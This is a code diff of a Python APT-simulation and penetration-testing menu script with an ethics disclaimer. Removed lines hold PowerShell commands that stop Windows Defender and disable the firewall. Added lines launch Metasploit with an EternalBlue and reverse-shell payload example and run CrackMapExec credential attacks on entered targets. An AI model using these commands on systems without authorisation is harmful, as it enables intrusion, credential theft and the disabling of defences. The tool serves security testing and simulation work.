@@ -59,24 +59,54 @@ def print_banner():
 
     """
 
-    print(splash)
-    print("MITRE ATT&CK Framerwork 41PH4-01\n")
+import json
+import time
+import datetime
+import subprocess
+import os
+import shutil
 
+# Disclaimer and Ethical Guidelines
+def display_disclaimer():
+    print("""
+    DISCLAIMER:
+    This script is intended for educational purposes only. It is not intended to cause any harm or damage.
+    You must have explicit permission from the owner of any system you target with this script.
+    Unauthorized testing and exploitation of systems is illegal and unethical.
+    Always ensure you have written consent before conducting any security testing.
+    """)
+
+# Banner
+def print_banner():
+    banner = r"""
+ _____  .___________________________________         _______________________________  _________   ____  __.     ___________                                                  __    
+  /     \ |   \__    ___/\______   \_   _____/        /  _  \__    ___/\__    ___/  _ \ \_   ___ \ |    |/ _|     \_   _____/____________     _____   ______  _  _____________|  | __
+ /  \ /  \|   | |    |    |       _/|    __)_        /  /_\  \|    |     |    |  >  _ </|    \  \/ |      <        |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
+/    Y    \   | |    |    |    |   \|        \      /    |    \    |     |    | /  <_\ \|     \____|    |  \       |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    < 
+\____|__  /___| |____|    |____|_  /_______  /______\____|__  /____|     |____| \_____\ \\______  /|____|__ \______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
+        \/                       \/        \//_____/        \/                         \/       \/         \/_____/    \/                \/       \/     \/                        \/
+        
+       MITRE ATT&CK Simulation & Penetration Testing Framework
+    """
+    print(banner)
 
 # Load APT group data from JSON file
 def load_apt_groups(filename="apt_groups.json"):
-    with open(filename, "r") as file:
-        return json.load(file)
+    try:
+        with open(filename, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        print(f"[ERROR] {filename} not found. Please ensure the file exists in the same directory.")
+        exit()
 
-# Function to display APT group details
-def display_apt_details(apt_name, apt_details):
-    print(f"\n[INFO] {apt_name}: {apt_details['description']}\n")
-
-# Function to display technique details
-def display_technique_details(technique):
-    print(f"\n[INFO] Technique: {technique['name']} ({technique['id']})")
-    print(f"Tactic: {technique['tactic']}")
-    print(f"Description: {technique['description']}\n")
+# Function to install missing tools
+def check_and_install_tools(tools):
+    for tool in tools:
+        if shutil.which(tool) is None:
+            print(f"[INFO] {tool} not found. Attempting to install...")
+            subprocess.run(["sudo", "apt-get", "install", "-y", tool], check=True)
+        else:
+            print(f"[INFO] {tool} is already installed.")
 
 # Function to log alerts
 def log_alert(apt_name, technique):
@@ -90,76 +120,124 @@ def log_alert(apt_name, technique):
     }
     with open("alerts_log.json", "a") as log_file:
         log_file.write(json.dumps(alert) + "\n")
-    print(f"[ALERT] Generated alert for {technique['name']} ({technique['id']})")
+    print(f"[ALERT] Logged alert for {technique['name']} ({technique['id']})")
 
-# Function to simulate a wide range of attack techniques
+# Simulate attack techniques
 def simulate_technique(apt_name, technique):
-    print(f"[INFO] Simulating technique {technique['name']} ({technique['id']}) for {apt_name}...")
-
-    # Map technique IDs to simulation functions
-    technique_simulation_map = {
-        "T1071": simulate_http_requests,
-        "T1059": simulate_command_execution,
-        "T1089": simulate_disable_security_tools,
-        # Add more mappings here as needed
-    }
-
-    # Call the corresponding simulation function if it exists
-    simulate_func = technique_simulation_map.get(technique["id"], simulate_generic_activity)
-    simulate_func()
-
-    print(f"[INFO] {technique['name']} simulation complete.\n")
-    # Generate an alert for the simulated technique
+    print(f"[INFO] Simulating {technique['name']} ({technique['id']}) for {apt_name}...")
+    if technique["id"] == "T1071":  # Example technique: HTTP requests
+        simulate_http_requests()
+    elif technique["id"] == "T1059":  # Example technique: Command execution
+        simulate_command_execution()
+    else:
+        simulate_generic_activity()
     log_alert(apt_name, technique)
 
+# Simulated Techniques
 def simulate_http_requests():
-    # Simulate HTTP requests using PowerShell
     endpoints = ["http://example.com", "http://example.org", "http://example.net"]
     for endpoint in endpoints:
-        subprocess.run(["powershell", "-Command", f"Invoke-WebRequest -Uri {endpoint} -UseBasicParsing"])
+        subprocess.run(["curl", endpoint])
         time.sleep(1)
 
 def simulate_command_execution():
-    # Simulate command execution using PowerShell
-    commands = [
-        "Get-Process",
-        "Get-Service",
-        "Write-Output 'Simulating APT activity' > C:\\Temp\\apt_simulation.log"
-    ]
-    for command in commands:
-        subprocess.run(["powershell", "-Command", command])
-        time.sleep(1)
-
-def simulate_disable_security_tools():
-    # Simulate disabling security tools using PowerShell
-    security_commands = [
-        "Stop-Service -Name 'WinDefend' -Force",  # Stop Windows Defender
-        "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"  # Disable Windows Firewall
-    ]
-    for command in security_commands:
-        subprocess.run(["powershell", "-Command", command])
+    commands = ["ls", "whoami", "uname -a"]
+    for cmd in commands:
+        subprocess.run(cmd, shell=True)
         time.sleep(1)
 
 def simulate_generic_activity():
-    # Simulate generic activity for techniques not specifically mapped
-    subprocess.run(["powershell", "-Command", "Write-Output 'Simulating generic APT activity' > C:\\Temp\\generic_apt_simulation.log"])
-    time.sleep(1)
+    print("[INFO] Simulating generic APT activity...")
+    time.sleep(2)
 
-# Main function to run the simulation
-def run_simulation():
-    apt_groups = load_apt_groups()  # Load APT group data
+# Penetration Testing Menu
+def penetration_testing_menu():
+    while True:
+        print("\nPenetration Testing Options:")
+        print("1. Nmap Scanning")
+        print("2. Exploitation (Metasploit)")
+        print("3. Credential Dumping (CrackMapExec)")
+        print("4. Return to Main Menu")
+        choice = input("Select an option: ")
+
+        if choice == "1":
+            nmap_scanning()
+        elif choice == "2":
+            metasploit_exploitation()
+        elif choice == "3":
+            crackmapexec_dumping()
+        elif choice == "4":
+            break
+        else:
+            print("[ERROR] Invalid option. Please try again.")
+
+# Nmap Scanning Function
+def nmap_scanning():
+    target = input("[INPUT] Enter target IP or subnet (e.g., 192.168.1.0/24): ")
+    print(f"[INFO] Running Nmap scan on {target}...")
+    subprocess.run(["nmap", "-sV", target])
+    print("[INFO] Nmap scan completed.")
+
+# Metasploit Exploitation Function
+def metasploit_exploitation():
+    target = input("[INPUT] Enter target IP: ")
+    exploit = input("[INPUT] Enter exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue): ")
+    payload = input("[INPUT] Enter payload (e.g., windows/meterpreter/reverse_tcp): ")
+    lhost = input("[INPUT] Enter LHOST (your IP): ")
+    lport = input("[INPUT] Enter LPORT (e.g., 4444): ")
+
+    print("[INFO] Launching Metasploit...")
+    msf_commands = f"""
+    use {exploit}
+    set RHOSTS {target}
+    set PAYLOAD {payload}
+    set LHOST {lhost}
+    set LPORT {lport}
+    exploit
+    """
+    subprocess.run(["msfconsole", "-q", "-x", msf_commands])
+
+# CrackMapExec Credential Dumping
+def crackmapexec_dumping():
+    target = input("[INPUT] Enter target subnet (e.g., 192.168.1.0/24): ")
+    username = input("[INPUT] Enter username: ")
+    password = input("[INPUT] Enter password: ")
+
+    print(f"[INFO] Running CrackMapExec on {target}...")
+    subprocess.run(["crackmapexec", "smb", target, "-u", username, "-p", password])
+
+# Main Function
+def main():
+    display_disclaimer()
+    print_banner()
+
+    # Check and install required tools
+    required_tools = ["nmap", "msfconsole", "crackmapexec", "curl"]
+    check_and_install_tools(required_tools)
+
+    # Load APT groups
+    apt_groups = load_apt_groups()
     print("[INFO] APT Groups loaded.")
 
-    # Loop through each APT group
-    for apt_name, apt_details in apt_groups.items():
-        display_apt_details(apt_name, apt_details)
+    while True:
+        print("\nMain Menu:")
+        print("1. Simulate APT Techniques")
+        print("2. Penetration Testing")
+        print("3. Exit")
+        choice = input("Select an option: ")
 
-        # Loop through each technique in the APT group
-        for technique in apt_details["techniques"]:
-            display_technique_details(technique)
-            simulate_technique(apt_name, technique)
-
-    print("[INFO] Simulation complete. Check alerts_log.json for generated alerts.")
+        if choice == "1":
+            for apt_name, apt_details in apt_groups.items():
+                print(f"\n[INFO] {apt_name}: {apt_details['description']}")
+                for technique in apt_details["techniques"]:
+                    simulate_technique(apt_name, technique)
+        elif choice == "2":
+            penetration_testing_menu()
+        elif choice == "3":
+            print("[INFO] Exiting framework. Goodbye!")
+            break
+        else:
+            print("[ERROR] Invalid option. Please try again.")
 
 if __name__ == "__main__":
-    run_simulation()
+    main()
